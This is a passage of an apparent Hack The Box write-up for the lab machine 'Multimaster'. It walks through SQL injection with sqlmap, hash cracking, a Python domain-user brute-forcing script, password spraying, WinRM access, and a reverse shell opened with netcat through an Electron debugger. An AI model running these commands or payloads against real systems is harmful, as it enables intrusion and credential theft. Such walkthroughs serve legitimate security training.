MEGACORP.LOCAL, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h26m16s, deviation: 4h02m30s, median: 6m16s | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-time: | date: 2023-10-08T18:52:41 |_ start_date: 2023-10-08T18:50:58 | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: MULTIMASTER | NetBIOS computer name: MULTIMASTER\\x00 | Domain name: MEGACORP.LOCAL | Forest name: MEGACORP.LOCAL | FQDN: MULTIMASTER.MEGACORP.LOCAL |_ System time: 2023-10-08T11:52:40-07:00 | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.26 seconds smb └─$ smbclient -N -L //10.10.10.179 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.179 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available Web Server gobuster WAF is probably blocking requests └─$ gobuster dir -u http://10.10.10.179 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -x asp,aspx,txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.179 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: asp,aspx,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.179/images/] /contact.asp (Status: 403) [Size: 1233] /full.asp (Status: 403) [Size: 1233] /full.txt (Status: 403) [Size: 1233] /full (Status: 403) [Size: 1233] /12.asp (Status: 403) [Size: 1233] /2006 (Status: 403) [Size: 1233] /12.aspx (Status: 403) [Size: 1233] /full.aspx (Status: 403) [Size: 1233] ... Foothold We have bunch of potential usernames Let\u0026rsquo;s open Burp and test for sqli If send special char, I receive 403 I also tested for nosqli, but received 500 Let\u0026rsquo;s fuzz for special chars └─$ wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d \u0026#39;{\u0026#34;name\u0026#34;:\u0026#34;FUZZ\u0026#34;}\u0026#39; -H \u0026#39;Content-Type: application/json;charset=utf-8\u0026#39; /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.179/api/getColleagues Total requests: 32 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 200 0 L 1 W 2 Ch \u0026#34;~\u0026#34; 000000029: 403 29 L 92 W 1233 Ch \u0026#34;\u0026#39;\u0026#34; 000000028: 403 29 L 92 W 1233 Ch \u0026#34;:\u0026#34; 000000032: 403 29 L 92 W 1233 Ch \u0026#34;\u0026gt;\u0026#34; 000000030: 403 29 L 92 W 1233 Ch \u0026#34;\u0026#34;\u0026#34; 000000003: 200 0 L 1 W 2 Ch \u0026#34;@\u0026#34; 000000015: 200 0 L 1 W 2 Ch \u0026#34;=\u0026#34; 000000007: 200 0 L 1 W 2 Ch \u0026#34;^\u0026#34; 000000031: 200 0 L 1 W 2 Ch \u0026#34;\u0026lt;\u0026#34; 000000014: 200 0 L 1 W 2 Ch \u0026#34;+\u0026#34; 000000027: 200 0 L 1 W 2 Ch \u0026#34;;\u0026#34; 000000026: 200 0 L 1 W 2 Ch \u0026#34;?\u0026#34; 000000025: 200 0 L 1 W 2 Ch \u0026#34;/\u0026#34; 000000024: 200 0 L 1 W 2 Ch \u0026#34;.\u0026#34; 000000023: 200 0 L 1 W 2 Ch \u0026#34;,\u0026#34; 000000022: 200 0 L 1 W 2 Ch \u0026#34;`\u0026#34; 000000021: 500 0 L 4 W 36 Ch \u0026#34;\\\u0026#34; 000000018: 200 0 L 1 W 2 Ch \u0026#34;]\u0026#34; 000000006: 403 29 L 92 W 1233 Ch \u0026#34;%\u0026#34; 000000019: 200 0 L 1 W 2 Ch \u0026#34;[\u0026#34; 000000017: 200 0 L 1 W 2 Ch \u0026#34;}\u0026#34; 000000016: 200 0 L 1 W 2 Ch \u0026#34;{\u0026#34; 000000013: 200 0 L 33 W 1821 Ch \u0026#34;_\u0026#34; 000000011: 200 0 L 1 W 2 Ch \u0026#34;)\u0026#34; 000000010: 200 0 L 1 W 2 Ch \u0026#34;(\u0026#34; 000000009: 200 0 L 1 W 2 Ch \u0026#34;*\u0026#34; 000000020: 200 0 L 1 W 2 Ch \u0026#34;|\u0026#34; 000000012: 200 0 L 1 W 2 Ch \u0026#34;-\u0026#34; 000000004: 403 29 L 92 W 1233 Ch \u0026#34;#\u0026#34; 000000008: 403 29 L 92 W 1233 Ch \u0026#34;\u0026amp;\u0026#34; 000000002: 200 0 L 1 W 2 Ch \u0026#34;!\u0026#34; 000000005: 403 29 L 92 W 1233 Ch \u0026#34;$\u0026#34; Total time: 0 Processed Requests: 32 Filtered Requests: 0 Requests/sec.: 0 If we set -t to 1, we receive other results └─$ wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d \u0026#39;{\u0026#34;name\u0026#34;:\u0026#34;FUZZ\u0026#34;}\u0026#39; -H \u0026#39;Content-Type: application/json;charset=utf-8\u0026#39; -t 1 --hc 200 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.179/api/getColleagues Total requests: 32 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000004: 403 29 L 92 W 1233 Ch \u0026#34;#\u0026#34; 000000021: 500 0 L 4 W 36 Ch \u0026#34;\\\u0026#34; 000000030: 500 0 L 4 W 36 Ch \u0026#34;\u0026#34;\u0026#34; 000000029: 403 29 L 92 W 1233 Ch \u0026#34;\u0026#39;\u0026#34; 000000031: 403 29 L 92 W 1233 Ch \u0026#34;\u0026lt;\u0026#34; 000000032: 403 29 L 92 W 1233 Ch \u0026#34;\u0026gt;\u0026#34; Total time: 0 Processed Requests: 32 Filtered Requests: 26 Requests/sec.: 0 If we take a closer look and Content-Type we see application/json;charset=utf-8 I have never seen it before It means that the content to be in JSON format, encoded in the UTF-8 character encoding. https://stackoverflow.com/questions/9254891/what-does-content-type-application-json-charset-utf-8-really-mean So if we send \\u27, which is ASCII value of ', we receive `500`` Possibly indicating that there\u0026rsquo;s an sqli Let\u0026rsquo;s use sqlmap I assume the dbms is mssql Let\u0026rsquo;s start with a lighter query In case I don\u0026rsquo;t have anything, I\u0026rsquo;ll run sqlmap with different parameters └─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql ___ __H__ ___ ___[\u0026#39;]_____ ___ ___ {1.7.9#stable} |_ -| . [)] | .\u0026#39;| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 14:34:33 /2023-10-13/ [14:34:33] [INFO] parsing HTTP request from \u0026#39;sqli.req\u0026#39; [14:34:33] [INFO] loading tamper module \u0026#39;charunicodeescape\u0026#39; JSON data found in POST body. Do you want to process it? [Y/n/q] Y [14:34:33] [INFO] testing connection to the target URL ... (custom) POST parameter \u0026#39;JSON name\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 466 HTTP(s) requests: --- Parameter: JSON name ((custom) POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT) Payload: {\u0026#34;name\u0026#34;:\u0026#34;\\u27\u0026#39; OR NOT 5590=5590-- bkOY\u0026#34;} Type: stacked queries Title: Microsoft SQL Server/Sybase stacked queries (comment) Payload: {\u0026#34;name\u0026#34;:\u0026#34;\\u27\u0026#39;;WAITFOR DELAY \u0026#39;0:0:5\u0026#39;--\u0026#34;} Type: time-based blind Title: Microsoft SQL Server/Sybase time-based blind (IF) Payload: {\u0026#34;name\u0026#34;:\u0026#34;\\u27\u0026#39; WAITFOR DELAY \u0026#39;0:0:5\u0026#39;-- Wvdt\u0026#34;} Type: UNION query Title: Generic UNION query (NULL) - 5 columns Payload: {\u0026#34;name\u0026#34;:\u0026#34;test\u0026#39; UNION ALL SELECT 58,58,58,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(107)+CHAR(113)+CHAR(68)+CHAR(105)+CHAR(69)+CHAR(119)+CHAR(71)+CHAR(98)+CHAR(76)+CHAR(83)+CHAR(102)+CHAR(68)+CHAR(114)+CHAR(73)+CHAR(109)+CHAR(73)+CH AR(98)+CHAR(101)+CHAR(116)+CHAR(99)+CHAR(70)+CHAR(80)+CHAR(103)+CHAR(101)+CHAR(86)+CHAR(113)+CHAR(73)+CHAR(82)+CHAR(103)+CHAR(90)+CHAR(115)+CHAR(114)+CHAR(76)+CHAR(73)+CHAR(77)+CHAR(105)+CHAR(103)+CHAR(73)+CHAR(71)+CHAR(67)+CHAR(83)+CHAR (111)+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(98)+CHAR(113),58-- gxQm\u0026#34;} --- [15:57:00] [WARNING] changes made by tampering scripts are not included in shown payload content(s) [15:57:00] [INFO] testing Microsoft SQL Server [15:57:05] [INFO] confirming Microsoft SQL Server [15:57:27] [INFO] the back-end DBMS is Microsoft SQL Server web server operating system: Windows 10 or 2022 or 2016 or 11 or 2019 web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 10.0 back-end DBMS: Microsoft SQL Server 2017 [15:57:27] [WARNING] HTTP error codes detected during run: 500 (Internal Server Error) - 2 times [15:57:27] [INFO] fetched data logged to text files under \u0026#39;/home/kali/.local/share/sqlmap/output/10.10.10.179\u0026#39; [*] ending @ 15:57:27 /2023-10-13/ Let\u0026rsquo;s dump the databases └─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql --dbs ... [17:13:49] [WARNING] in case of continuous data retrieval problems you are advised to try a switch \u0026#39;--no-cast\u0026#39; or switch \u0026#39;--hex\u0026#39; available databases [4]: [*] Hub_DB [*] [master] [*] model [*] msdb [*] tempdb └─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql --exclude-sysdbs --dump-all ... Database: Hub_DB Table: Colleagues [17 entries] +------+----------------------+-------------+----------------------+----------------------+ | id | email | image | name | position | +------+----------------------+-------------+----------------------+----------------------+ | 1 | sbauer@megacorp.htb | sbauer.jpg | Sarina Bauer | Junior Developer | | 2 | okent@megacorp.htb | okent.jpg | Octavia Kent | Senior Consultant | | 3 | ckane@megacorp.htb | ckane.jpg | Christian Kane | Assistant Manager | | 4 | kpage@megacorp.htb | kpage.jpg | Kimberly Page | Financial Analyst | | 5 | shayna@megacorp.htb | shayna.jpg | Shayna Stafford | HR Manager | | 6 | james@megacorp.htb | james.jpg | James Houston | QA Lead | | 7 | cyork@megacorp.htb | cyork.jpg | Connor York | Web Developer | | 8 | rmartin@megacorp.htb | rmartin.jpg | Reya Martin | Tech Support | | 9 | zac@magacorp.htb | zac.jpg | Zac Curtis | Junior Analyst | | 10 | jorden@megacorp.htb | jorden.jpg | Jorden Mclean | Full-Stack Developer | | 11 | alyx@megacorp.htb | alyx.jpg | Alyx Walters | Automation Engineer | | 12 | ilee@megacorp.htb | ilee.jpg | Ian Lee | Internal Auditor | | 13 | nbourne@megacorp.htb | nbourne.jpg | Nikola Bourne | Head of Accounts | | 14 | zpowers@megacorp.htb | zpowers.jpg | Zachery Powers | Credit Analyst | | 15 | aldom@megacorp.htb | aldom.jpg | Alessandro Dominguez | Senior Web Developer | | 16 | minato@megacorp.htb | minato.jpg | MinatoTW | CEO | | 17 | egre55@megacorp.htb | egre55.jpg | egre55 | CEO | +------+----------------------+-------------+----------------------+----------------------+ ... Database: Hub_DB Table: Logins [17 entries] +------+----------+--------------------------------------------------------------------------------------------------+ | id | username | password | +------+----------+--------------------------------------------------------------------------------------------------+ | 1 | sbauer | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | | 2 | okent | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | | 3 | ckane | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | | 4 | kpage | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | | 5 | shayna | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | | 6 | james | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | | 7 | cyork | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | | 8 | rmartin | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | | 9 | zac | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | | 10 | jorden | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | | 11 | alyx | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | | 12 | ilee | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | | 13 | nbourne | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | | 14 | zpowers | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | | 15 | aldom | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | | 16 | minatotw | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | | 17 | egre55 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | +------+----------+--------------------------------------------------------------------------------------------------+ ... Let\u0026rsquo;s crack the hashes └─$ hashcat -m 17900 hash /usr/share/wordlists/rockyou.txt --force hashcat (v6.2.6) starting You have enabled --force to bypass dangerous warnings and errors! This can hide serious problems and should only be done when debugging. Do not report hashcat issues encountered when using --force. ... 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1 fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1 ... Looks like we have following creds password1 - sbauer, shayna, james, cyork, jorden, aldom finance1 - ckane, kpage, zac, ilee, zpowers banking1 - okent, rmartin, alyx, nbourne Testing for validity of the accounts shows nothing └─$ crackmapexec smb 10.10.10.179 -u users.list -p passwords.list SMB 10.10.10.179 445 MULTIMASTER [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\sbauer:password1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\sbauer:finance1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\sbauer:banking1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\okent:password1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\okent:finance1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\okent:banking1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\ckane:password1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\ckane:finance1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\ckane:banking1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\kpage:password1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\kpage:finance1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\kpage:banking1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\shayna:password1 STATUS_LOGON_FAILURE ... There is a way for us to dump domain users https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/ Below is the script that does that But before that we have to know: The name of the domain: MEGACORP.LOCAL or default_domain() SID of the domain using select sys.fn_varbintohexstr(SUSER_SID('MEGACORP.LOCAL\\Administrator')) Then we bruteforce RIDs to get AD users We will use the payload from the sqlmap test' UNION ALL SELECT 58,58,58,{},58-- - The response will be in the form of [{\u0026quot;id\u0026quot;:58,\u0026quot;name\u0026quot;:\u0026quot;58\u0026quot;,\u0026quot;position\u0026quot;:\u0026quot;58\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;src\u0026quot;:\u0026quot;58\u0026quot;}] Where email will contain the result of the query import sys import time import struct import binascii import requests URL = \u0026#34;http://10.10.10.179/api/getColleagues\u0026#34; HEADERS = {\u0026#34;Content-Type\u0026#34;: \u0026#34;application/json;charset=utf-8\u0026#34;} PAYLOAD = \u0026#34;\u0026#34;\u0026#34;test\u0026#39; UNION ALL SELECT 58,58,58,{},58-- -\u0026#34;\u0026#34;\u0026#34; PROXY = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} def unicode_convert(data): payload = \u0026#34;\u0026#34; for char in data: payload += r\u0026#34;\\u{:04x}\u0026#34;.format(ord(char)) return payload def perform_query(query): data = \u0026#39;{\u0026#34;name\u0026#34;:\u0026#34;\u0026#39; + unicode_convert(PAYLOAD.format(query)) + \u0026#39;\u0026#34;}\u0026#39; r = requests.post(URL, headers = HEADERS, data = data, proxies = PROXY) return r.json()[0][\u0026#34;email\u0026#34;] def bruteforce(sid): for i in range(500, 5000): rid = binascii.hexlify(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, i)).decode() query = f\u0026#34;SUSER_SNAME({sid}{rid})\u0026#34;\tuser = perform_query(query) if user: print(f\u0026#34;[+] User: {user}\u0026#34;) time.sleep(10) return 0 if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;[*] Gathering required information for attack\u0026#34;) print(\u0026#34;[*] Step 1: Domain name\u0026#34;) domain = perform_query(\u0026#34;DEFAULT_DOMAIN()\u0026#34;) print(f\u0026#34;[+] Domain name: {domain}\u0026#34;) print(\u0026#34;[*] Step 2: Domain SID\u0026#34;) sid = perform_query(f\u0026#34;sys.fn_varbintohexstr(SUSER_SID(\u0026#39;{domain}\\Administrator\u0026#39;))\u0026#34;)[:-8] print(f\u0026#34;[+] Domain SID: {sid}\u0026#34;) print(f\u0026#34;[*] Starting domain user bruteforce for {domain} domain: {sid}\u0026#34;) bruteforce(sid) print() The script will take more └─$ python3 mssql-domain-user-bruteforcer.py [*] Gathering required information for attack [*] Step 1: Domain name [+] Domain name: MEGACORP [*] Step 2: Domain SID [+] Domain SID: 0x0105000000000005150000001c00d1bcd181f1492bdfc236 [*] Starting domain user bruteforce for MEGACORP domain: 0x0105000000000005150000001c00d1bcd181f1492bdfc236 [+] User: MEGACORP\\Administrator [+] User: MEGACORP\\Guest [+] User: MEGACORP\\krbtgt [+] User: MEGACORP\\DefaultAccount [+] User: MEGACORP\\Domain Admins [+] User: MEGACORP\\Domain Users [+] User: MEGACORP\\Domain Guests [+] User: MEGACORP\\Domain Computers [+] User: MEGACORP\\Domain Controllers [+] User: MEGACORP\\Cert Publishers [+] User: MEGACORP\\Schema Admins [+] User: MEGACORP\\Enterprise Admins [+] User: MEGACORP\\Group Policy Creator Owners [+] User: MEGACORP\\Read-only Domain Controllers [+] User: MEGACORP\\Cloneable Domain Controllers [+] User: MEGACORP\\Protected Users [+] User: MEGACORP\\Key Admins [+] User: MEGACORP\\Enterprise Key Admins [+] User: MEGACORP\\RAS and IAS Servers [+] User: MEGACORP\\Allowed RODC Password Replication Group [+] User: MEGACORP\\Denied RODC Password Replication Group [+] User: MEGACORP\\MULTIMASTER$ [+] User: MEGACORP\\DnsAdmins [+] User: MEGACORP\\DnsUpdateProxy [+] User: MEGACORP\\svc-nas [+] User: MEGACORP\\Privileged IT Accounts [+] User: MEGACORP\\tushikikatomo [+] User: MEGACORP\\andrew [+] User: MEGACORP\\lana [+] User: MEGACORP\\alice [+] User: MEGACORP\\test [+] User: MEGACORP\\dai [+] User: MEGACORP\\svc-sql [+] User: MEGACORP\\SQLServer2005SQLBrowserUser$MULTIMASTER [+] User: MEGACORP\\sbauer [+] User: MEGACORP\\okent [+] User: MEGACORP\\ckane [+] User: MEGACORP\\kpage [+] User: MEGACORP\\james [+] User: MEGACORP\\cyork [+] User: MEGACORP\\rmartin [+] User: MEGACORP\\zac [+] User: MEGACORP\\jorden [+] User: MEGACORP\\alyx [+] User: MEGACORP\\ilee [+] User: MEGACORP\\nbourne [+] User: MEGACORP\\zpowers [+] User: MEGACORP\\aldom [+] User: MEGACORP\\jsmmons [+] User: MEGACORP\\pmartin [+] User: MEGACORP\\Developers Now when we check with crackmapexec we have a hit └─$ crackmapexec smb 10.10.10.179 -u users.list -p passwords.list SMB 10.10.10.179 445 MULTIMASTER [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\svc-nas:password1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\svc-nas:finance1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\svc-nas:banking1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\Privileged:password1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\Privileged:finance1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\Privileged:banking1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [-] MEGACORP.LOCAL\\tushikikatomo:password1 STATUS_LOGON_FAILURE SMB 10.10.10.179 445 MULTIMASTER [+] MEGACORP.LOCAL\\tushikikatomo:finance1 ... And tushikikatomo has right to winrm └─$ evil-winrm -u \u0026#34;MEGACORP\\tushikikatomo\u0026#34; -p finance1 -i 10.10.10.179 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\alcibiades\\Documents\u0026gt; User #1 If we enumerate, we see Code application *Evil-WinRM* PS C:\\Users\\alcibiades\\Documents\u0026gt; get-process Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName ------- ------ ----- ----- ------ -- -- ----------- 413 22 13884 9552 264 1 Code 404 54 96576 114656 1672 1 Code 404 53 96584 53792 2052 1 Code 278 53 45172 61420 2412 1 Code 277 51 58304 61732 2644 1 Code 658 48 33332 71980 3328 1 Code 407 56 135720 170088 5228 1 Code 214 15 6144 4192 5296 1 Code 276 51 58184 23668 5672 1 Code 318 31 39936 28428 6008 1 Code 355 13 1872 4248 368 0 csrss ... *Evil-WinRM* PS C:\\program files\u0026gt; ls Directory: C:\\program files Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/25/2019 10:59 AM Common Files d----- 1/9/2020 2:39 PM Internet Explorer d----- 1/7/2020 9:40 PM Microsoft da---- 1/7/2020 7:47 PM Microsoft SQL Server d----- 1/7/2020 7:26 PM Microsoft Visual Studio 10.0 da---- 1/9/2020 3:18 AM Microsoft VS Code d----- 1/7/2020 7:27 PM Microsoft.NET d----- 1/7/2020 9:43 PM Reference Assemblies d----- 7/19/2021 1:07 AM VMware d-r--- 1/9/2020 2:46 PM Windows Defender d----- 1/9/2020 2:39 PM Windows Mail d----- 1/9/2020 2:39 PM Windows Media Player d----- 7/16/2016 6:23 AM Windows Multimedia Platform d----- 7/16/2016 6:23 AM Windows NT d----- 1/9/2020 2:39 PM Windows Photo Viewer d----- 7/16/2016 6:23 AM Windows Portable Devices d----- 7/16/2016 6:23 AM WindowsPowerShell We have a pretty old Visual Studio running There was a lot of googling, but essentially Visual Studio is built on Electron And Electron leaves debugger enabled We can check for existense of debugger sockets https://github.com/taviso/cefdebug *Evil-WinRM* PS C:\\windows\\system32\\spool\\drivers\\color\u0026gt; .\\cefdebug.exe cefdebug.exe : [2023/10/15 04:04:15:3788] U: There are 6 tcp sockets in state listen. + CategoryInfo : NotSpecified: ([2023/10/15 04:...n state listen.:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError [2023/10/15 04:04:35:4556] U: There were 4 servers that appear to be CEF debuggers. [2023/10/15 04:04:35:4556] U: ws://127.0.0.1:46429/82d09d60-7b67-4d29-82ac-4bbef694e26b [2023/10/15 04:04:35:4556] U: ws://127.0.0.1:51469/864bcab8-5e95-4dc3-99c8-48ccf8669bcd [2023/10/15 04:04:35:4556] U: ws://127.0.0.1:17095/7f4e7f80-a560-4708-a031-b8b1b22f688f [2023/10/15 04:04:35:4556] U: ws://127.0.0.1:6279/da22c63e-5b04-4cea-8e4a-a5c535aaaa9e We can check version Note, sockets last few seconds, so we have to run .exe without args to find the sockets *Evil-WinRM* PS C:\\windows\\system32\\spool\\drivers\\color\u0026gt; .\\cefdebug.exe --code \u0026#34;process.version\u0026#34; --url ws://127.0.0.1:29638/05b95af9-71ae-40e9-a8a4-43b90f07fda5 cefdebug.exe : [2023/10/15 04:09:38:1024] U: \u0026gt;\u0026gt;\u0026gt; process.version + CategoryInfo : NotSpecified: ([2023/10/15 04:...process.version:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError [2023/10/15 04:09:38:1024] U: \u0026lt;\u0026lt;\u0026lt; v10.11.0 Let\u0026rsquo;s get reverse shell *Evil-WinRM* PS C:\\programdata\u0026gt; .\\cefdebug.exe --code \u0026#34;process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;C:\\\\programdata\\\\nc.exe 10.10.16.9 443 -e cmd.exe\u0026#39;)\u0026#34; --url ws://127.0.0.1:56407/8c993c24-1acd-45e5-a87e-0131fef41a87 cefdebug.exe : [2023/10/15 04:21:08:1041] U: \u0026gt;\u0026gt;\u0026gt; process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;C:\\\\programdata\\\\nc.exe 10.10.16.9 443 -e cmd.exe\u0026#39;) + CategoryInfo : NotSpecified: ([2023/10/15 04:...43 -e cmd.exe\u0026#39;):String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError [2023/10/15 04:21:08:1041] U: \u0026lt;\u0026lt;\u0026lt; ChildProcess *Evil-WinRM* PS C:\\programdata\u0026gt; └─$ rlwrap nc -vlnp 443 listening on [any] 443 ... connect to [10.10.16.9] from (UNKNOWN) [10.10.10.179] 50361 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Program Files\\Microsoft VS Code\u0026gt;whoami whoami megacorp\\cyork C:\\Program Files\\Microsoft VS Code\u0026gt; User #2 We are developers So now we can check inetpub\\wwwroot\\ C:\\Program Files\\Microsoft VS Code\u0026gt;whoami /all whoami /all USER INFORMATION ---------------- User Name SID ============== ============================================= megacorp\\cyork S-1-5-21-3167813660-1240564177-918740779-3107 GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============================================= ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group 